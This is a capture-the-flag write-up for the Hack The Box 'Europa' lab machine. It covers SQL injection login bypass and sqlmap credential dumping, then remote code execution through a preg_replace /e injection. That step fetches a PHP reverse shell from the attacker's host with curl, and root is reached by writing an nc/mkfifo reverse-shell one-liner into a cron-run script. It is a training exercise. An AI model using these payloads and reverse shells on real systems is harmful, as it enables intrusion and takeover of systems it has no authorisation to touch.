# Europa

Europa was a medium linux box that required an sql injection to bypass login followed by a reverse shell in the place of parameters using burpsuite, root involved enumeration of a cronjobs file being ran as root to get a shell.

# USER

## enumeration

Of course we start off with an nmap scan to reveal 2 main ports needed for this challenge.

```bash
root@kali:/home/kali/boxes/europa# nmap -sC -sV -o nmap 10.10.10.22
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 10:07 EDT
Nmap scan report for 10.10.10.22
Host is up (0.021s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Sql injection

In the SSL cert for https we can see that there is a subdomain called `admin-portal` running on the domain `europacorp.htb`. 

We add both of theese to our hosts file and enumerate the site on https.

We are greeted by a login page and we intercept the request with burpsuite to take a look at the parameters that it is executing.

It simply just asks for an email and a username. We start off with some simple sql injection tests to see if the site is vulnerable.

We get a redirect to a dashboard page with the parameters:
```bash
email=`UNION ALL SELECT NULL,NULL,NULL,NULL,NULL##&password=`UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
```

This is one way of doing it but i will cover another method using sqlmap.

As we know that the site is vulnerable we test params with sqlmap.

Theese are the commands that i used:
```bash
sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever"

sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever" –dbs

sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever" –tables -D admin

sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever" –tables –columns -D admin -T users

sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever" -D admin -T users –dump password
```

The final command brings us the password dump:
```bash
+----+----------------------+--------+---------------+----------------------------------+
| id | email                | active | username      | password                         |
+----+----------------------+--------+---------------+----------------------------------+
| 1  | admin@europacorp.htb | 1      | administrator | 2b6d315337f18617ba18922c0b9597ff |
| 2  | john@europacorp.htb  | 1      | john          | 2b6d315337f18617ba18922c0b9597ff |
+----+----------------------+--------+---------------+----------------------------------+
```

We decrypt the password and login with `admin@europacorp.htb:SuperSecretPassword!` , note that this is an md5 hash that can be decrypted with an online tool.

After logging in we navigate to tools where we can see what seems to be an openvpn config file.

```bash
"openvpn": {
        "vtun0": {
                "local-address": {
                        "10.10.10.1": "''"
                },
                "local-port": "1337",
                "mode": "site-to-site",
                "openvpn-option": [
                        "--comp-lzo",
                        "--float",
                        "--ping 10",
                        "--ping-restart 20",
                        "--ping-timer-rem",
                        "--persist-tun",
                        "--persist-key",
                        "--user nobody",
                        "--group nogroup"
                ],
                "remote-address": "ip_address",
                "remote-port": "1337",
                "shared-secret-key-file": "/config/auth/secret"
        },
        "protocols": {
                "static": {
                        "interface-route": {
                                "ip_address/24": {
                                        "next-hop-interface": {
                                                "vtun0": "''"
                                        }
                                }
                        }
                }
        }
}

```

We press generate and intercept this again with burpsuite.

```bash
pattern=%2Fip_address%2F&ipaddress=&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++%7D%0D%0A++++++++++++++++%7D%0D%0A++++++++%7D%0D%0A%7D%0D%0A++++++++++++++++++++++++++++++++
```

This is what it brings back, essentially url encoded the config above with a pattern param and ip address parameter. We tweak this to get command execution.
```bash
pattern=/ip_address/e&ipaddress=system('whoami')&text=....
```

This brings back the result `www-data` so we know we can continue with this.

After alot of tweaking we change it to get a file from our box and execute it.
```bash
pattern=/vtun0/e&ipaddress=system('curl+http%3a//10.10.xx.xx%3a8000/php-reverse-shell.php+|+php')&text=...
```

We get a connection on our netcat listener and we get a shell on the box!

## User flag

```bash
kali@kali:~/boxes/europa$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.22] 33246
Linux europa 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:17:06 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:06:16 up 4 min,  0 users,  load average: 0.01, 0.08, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
john
$ cd john
$ cat user.txt
2f8d40{...}
```

# ROOT

## enumeration 

After running `pspy` on the system we find a binary `clearlogs` running as root on the system. We read the file to take a look at it.

>clearlogs:
```php
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```
## Exploitation

We can see that it is running the file `logcleared.sh` in the system so we will see if we can change the contents of that file to give us a root shell.

We echo a reverse shell to the file and wait a few seconds for it to execute and we get our shell.
```bash
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9001 > /tmp/f' > /var/www/cmd/logcleared.sh
$ chmod 777 /var/www/cmd/logcleared.sh


root@kali:/home/kali/boxes/europa# nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.22] 33248
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
7f19438b275{...}
```

Thanks for reading hope that you enjoyed.
